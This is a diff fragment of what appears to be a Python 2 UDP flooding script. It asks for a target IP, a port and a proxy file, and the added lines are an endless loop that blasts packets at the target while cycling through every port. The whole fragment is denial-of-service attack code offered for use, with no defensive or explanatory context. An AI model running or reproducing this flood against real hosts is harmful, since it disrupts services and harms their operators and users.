@@ -333,13 +333,17 @@ print('''
 ip = raw_input("IP Target : ")
 port = input("Port : ")
 	
-	
-	
-#Proxy
+
 in_file = open(raw_input("File Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
 
-
-
 listaproxy = proxyf.split('\n')
+
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
